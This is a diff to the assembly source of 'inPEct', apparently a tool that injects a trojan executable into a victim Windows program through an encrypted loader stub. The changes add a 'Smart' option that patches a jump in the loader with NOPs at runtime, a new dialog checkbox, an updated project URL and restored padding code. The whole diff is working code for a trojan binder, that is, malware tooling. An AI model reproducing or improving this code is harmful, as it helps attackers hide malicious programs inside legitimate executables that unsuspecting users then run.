@@ -17,6 +17,8 @@ EXTRN	GetFileTime			: PROC
 EXTRN	SetFileTime			: PROC
 EXTRN	LocalFree			: PROC
 EXTRN   FormatMessageA                  : PROC
+EXTRN	IsDlgButtonChecked		: PROC
+EXTRN	CheckDlgButton			: PROC
 
 
         DATASEG
@@ -31,6 +33,7 @@ IDC_LTROJAN	EQU		2000
 IDC_LOUTDIR	EQU		3000
 IDC_WWW		EQU		4000
 IDC_INPECT	EQU		5000
+IDC_SMART	EQU		6000
 
 
 BROWSEINFO	STRUC
@@ -46,7 +49,7 @@ BROWSEINFO	ENDS
 
 
 bTitle		DB	"Select output directory:", NULL
-URL		DB	"http://sysd.hypermart.net/programs#inpect", NULL
+URL		DB	"http://sysdlabs.hypermart.net/proj/exe.html#inpect", NULL
 
 OutDir		DB	"\Output", NULL
 OutDir_		EQU	$ - offset OutDir
@@ -107,6 +110,8 @@ TrojanFilter	DB	"Windows Executable Files (*.exe)", NULL, "*.exe", NULL
 		DB	NULL
 
         UDATASEG
+
+Smart_code	DW	?
 
 hInst           DD      ?
 hWnd		DD	?
@@ -178,6 +183,9 @@ Start:
         call    GetModuleHandle, NULL
         mov     [hInst], eax
 
+	; backup compiled code ;)
+	mov	ax, WORD PTR [Smart]
+	mov	[Smart_code], ax
 
         ; Set "random" seed
         call    GetSystemTime, offset SysTime
@@ -229,6 +237,8 @@ DlgProc PROC
 @@InitDialog:
 	call    LoadIcon, hInst, IDI_ICON
 	call    SendMessage, hWnd, 80h, 0, eax
+
+	call	CheckDlgButton, hWnd, IDC_SMART, TRUE
 
 	call	GetCurrentDirectory, PathName_, offset PathName
 	mov	edi, offset PathName
@@ -326,6 +336,14 @@ DlgProc PROC
 
 do_inPEct PROC
 	USES	ebx, ecx, edx, esi, edi
+
+	call	IsDlgButtonChecked, hWnd, IDC_SMART
+	.if	eax == BST_CHECKED
+		mov	ax, 9090h	; 2 NOPs
+	.else
+		mov	ax, [Smart_code]
+	.endif
+	mov	WORD PTR [Smart], ax
 
 	call	GetDlgItemText, hWnd, IDC_TROJAN, offset Trojan, PathName_
 	call	GetDlgItemText, hWnd, IDC_VICTIM, offset PathName, PathName_
@@ -1227,6 +1245,10 @@ Encrypted_Start:
         rep     movsd					; MOVSD goes faster ;)
 
 
+Smart:
+	jmp	short @@Load
+
+
 	lea	eax, [ebp + @DLL_Name] 
 	call	@_LoadLibraryA, eax
 	or	eax, eax
@@ -1373,10 +1395,10 @@ Mark		DB	Mark_ DUP (?)
 Data_		DD	?
 Data		DD	?
 
-;padder = Enc_Len MOD 4
-;IF padder
-; _pad           DB      padder DUP (?)
-;ENDIF
+padder = Enc_Len MOD 4
+IF padder
+ _pad           DB      padder DUP (?)
+ENDIF
 
 Ldr_End:
 
